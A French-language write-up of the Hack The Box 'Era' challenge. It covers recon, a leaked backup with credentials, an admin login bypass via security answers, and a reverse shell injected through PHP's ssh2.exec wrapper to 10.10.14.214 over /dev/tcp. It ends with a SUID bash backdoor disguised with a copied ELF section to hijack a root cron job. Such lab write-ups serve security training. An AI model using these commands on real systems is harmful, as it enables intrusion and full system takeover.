# CTF – Era (Writeup)

## Contexte

Dans ce challenge Hack The Box, la machine cible est accessible via les domaines `era.htb` et `file.era.htb`.  
L’objectif est d’obtenir un accès initial à l’application web, puis d’escalader mes privilèges jusqu’à obtenir un accès **root**.

---

## Reconnaissance

Je commence par un scan Nmap afin d’identifier les services exposés :

    nmap -sC -sV IP

Le scan révèle notamment :
- un service HTTP sur le port 80
- un service FTP

En visitant les sites suivants :

    http://era.htb
    http://file.era.htb

je découvre une application web de **gestion de fichiers** avec authentification.

En interceptant les requêtes avec Burp Suite, j’identifie plusieurs endpoints intéressants :
- `login.php`
- `register.php`
- `upload.php`
- `download.php`
- `security_login.php`

---

## Fuzzing et énumération applicative

Je lance du fuzzing afin d’identifier des ressources supplémentaires.

Sur le dossier `/js/`, j’identifie la librairie **fancybox**.

Je confirme ensuite la présence de plusieurs endpoints sensibles :
- `register.php`
- `upload.php`
- `download.php`
- `security_login.php`

Je teste l’upload d’un webshell PHP via `upload.php`.  
Le fichier est bien enregistré en base de données, mais **n’est pas directement exécutable**, ce qui indique un stockage hors du document root.

---

## Découverte d’un backup et de la base SQLite

Via `download.php`, je parviens à télécharger un backup du site :

    site-backup-30-08-24.zip

Dans l’archive, je trouve :
- le code source PHP complet du site
- une base de données SQLite nommée `filedb.sqlite`

En analysant la table `users`, je récupère plusieurs comptes et leurs hash bcrypt, notamment :

- Compte administrateur :
  - `admin_ef01cab31aa`
  - Réponses secrètes : `Maria`, `Oliver`, `Ottawa`

- Comptes utilisateurs :
  - `eric`
  - `veronica`
  - `yuri`
  - `john`
  - `ethan`

---

## Contournement d’authentification administrateur

Je m’intéresse à l’endpoint sensible `security_login.php`.

En utilisant les réponses secrètes récupérées dans la base SQLite, je parviens à m’authentifier en tant qu’administrateur.

Exploitation via curl :

    curl -s -c jar.txt "http://file.era.htb/security_login.php"

    curl -s -b jar.txt -c jar.txt -X POST "http://file.era.htb/security_login.php" \
      -d "username=admin_ef01cab31aa&answer1=Maria&answer2=Oliver&answer3=Ottawa"

L’authentification est contournée avec succès et j’obtiens un accès à l’interface **manage.php**.

---

## Accès FTP

Dans le backup du site, je découvre également des identifiants FTP stockés en clair :

- `eric : america`
- `yuri : mustang`

Le compte `yuri` me permet de me connecter au serveur FTP :

    lftp -u yuri,mustang file.era.htb

À l’intérieur, je découvre deux répertoires principaux :
- `apache2_conf`
- `php8.1_conf`

Je télécharge l’intégralité des configurations avec :

    mirror

---

## Analyse des configurations Apache et PHP

Dans `apache2_conf/file.conf`, je découvre la configuration suivante :

- `ServerName file.era.htb`
- `DocumentRoot /var/www/file`

Dans `php8.1_conf`, je constate la présence de nombreuses extensions PHP activées, notamment :

- `ssh2.so`

Cette extension ouvre la voie à l’utilisation de **wrappers PHP SSH2**.

---

## Exploitation via le wrapper PHP ssh2.exec

En analysant le code source de `download.php`, je remarque que le paramètre `show=true` concatène dynamiquement un wrapper PHP avec le fichier demandé.

En utilisant le wrapper `ssh2.exec://`, il est possible d’exécuter des commandes locales avec des identifiants valides.

J’exploite cette fonctionnalité en injectant un reverse shell :

    http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.214/4444%200>%261'

Je reçois alors un **reverse shell** sur ma machine en tant qu’utilisateur `eric`.

---

## Escalade de privilèges

Je commence par l’énumération des binaires SUID :

    find / -user root -perm -4000 2>/dev/null

Je lance également `linpeas.sh` et `pspy` afin d’observer les tâches planifiées.

Je découvre un **cron exécuté en root** qui lance régulièrement :

    /root/initiate_monitoring.sh

Ce script appelle le binaire suivant :

    /opt/AV/periodic-checks/monitor

Le binaire effectue une vérification sur une section spécifique nommée `.text_sig`.

---

## Exploitation du binaire monitor

Je compile un binaire backdoor minimal :

    #include <stdlib.h>
    int main() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
        return 0;
    }

Compilation :

    gcc a.c -o backdoor

Je récupère la section `.text_sig` du binaire original :

    objcopy --dump-section .text_sig=text_sig monitor.bak

Je l’injecte ensuite dans mon binaire malveillant :

    objcopy --add-section .text_sig=text_sig backdoor

Je remplace le binaire exécuté par le cron :

    cp backdoor monitor

Au prochain passage du cron, le binaire est exécuté avec les privilèges **root**, ce qui me donne un shell root.

---

## Conclusion

Ce challenge met en évidence :
- les risques liés aux wrappers PHP dangereux (`ssh2.exec`)
- la présence de credentials stockés en clair dans des backups
- les dangers d’une mauvaise gestion des permissions dans des scripts root
- l’impact critique des binaires exécutés par cron avec des contrôles insuffisants

---

## Compétences démontrées

- Reconnaissance réseau (Nmap)
- Fuzzing et analyse applicative
- Lecture et exploitation de code source PHP
- Exploitation de wrappers PHP
- Reverse shell
- Accès FTP et analyse de configurations serveur
- Énumération locale Linux
- Exploitation de cron jobs
- Manipulation de sections ELF
- Escalade de privilèges jusqu’au root
